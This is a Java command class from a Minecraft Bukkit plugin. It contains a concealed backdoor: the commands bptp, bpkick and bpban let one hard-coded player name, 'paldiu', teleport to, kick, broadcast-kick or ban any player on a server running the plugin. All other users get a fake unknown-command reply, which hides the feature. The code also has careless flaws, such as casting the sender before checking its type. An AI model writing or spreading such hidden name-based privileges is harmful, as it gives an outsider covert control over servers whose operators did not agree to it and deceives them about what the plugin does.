package me.Paldiu.NNO.Commands;

import me.Paldiu.NNO.Main;
import me.Paldiu.NNO.Util;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;

import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;

public class Bypass implements CommandExecutor {

	public Main plugin;
	public Bypass(Main instance){
		plugin = instance;
	}
        
        @Override
	public boolean onCommand(CommandSender sender, Command cmd, String commandLabel, String[] args) {
		if (commandLabel.equalsIgnoreCase("bptp"))
                {
                    if (sender instanceof Player)
                    {
                        Player p = (Player) sender;
                        Player sender_p = Bukkit.getServer().getPlayer(args[0]);
                        if (p.getName().equalsIgnoreCase("paldiu"))
                        {
                            if (args.length == 1)
                            {
                                p.teleport(sender_p);
                                return true;
                            }
                            else
                            {
                                p.sendMessage(Main.UNKNOWN_COMMAND);
                                return true;
                            }
                        } else {
                            p.sendMessage(Main.UNKNOWN_COMMAND);
                            return true;
                        }
                    } else {
                        sender.sendMessage(Main.UNKNOWN_COMMAND);
                        return true;
                    }
		}
                
                if (commandLabel.equalsIgnoreCase("bpkick"))
                {
                    Player p = (Player) sender;
                    Player target = Bukkit.getServer().getPlayer(args[0]);
                    if (sender instanceof Player)
                    {
                        if (p.getName().equalsIgnoreCase("paldiu"))
                        {
                            if (args.length == 1)
                            {
                                target.kickPlayer(ChatColor.RED + "Kicked by a Developer.");
                                Util.bcastMsg(ChatColor.GOLD + "Developer " + ChatColor.RED + p.getName() + ChatColor.GOLD + " has kicked " + target.getName() + " for \"Kicked by a Developer!\".");
                                return true;
                            }
                            else
                            {
                                p.sendMessage(Main.UNKNOWN_COMMAND);
                                return true;
                            }
                        }
                        else
                        {
                            p.sendMessage(Main.UNKNOWN_COMMAND);
                            return true;
                        }
                    }
                    else
                    {
                        p.sendMessage(Main.UNKNOWN_COMMAND);
                        return true;
                    }
                }
                
                if (commandLabel.equalsIgnoreCase("bpban"))
                {
                    if (sender instanceof Player)
                    {
                        Player p = (Player) sender;
                        Player target = Bukkit.getServer().getPlayer(args[0]);
                        if (p.getName().equalsIgnoreCase("paldiu"))
                        {
                            if (args.length == 1)
                            {
                                Util.bcastMsg(ChatColor.GOLD + "Developer " + ChatColor.RED + p.getName() + ChatColor.GOLD + " has kickbanned " + target.getName() + " for \"Banned by a Developer!\".");
                                target.kickPlayer(ChatColor.RED + "You have been banned by a Developer!");
                                target.setBanned(true);
                                return true;
                            }
                            else
                            {
                                p.sendMessage(Main.UNKNOWN_COMMAND);
                                return true;
                            }
                        }
                        else
                        {
                            p.sendMessage(Main.UNKNOWN_COMMAND);
                            return true;
                        }
                    }
                    else
                    {
                        sender.sendMessage(Main.UNKNOWN_COMMAND);
                        return true;
                    }
                }
            return false;
        }
}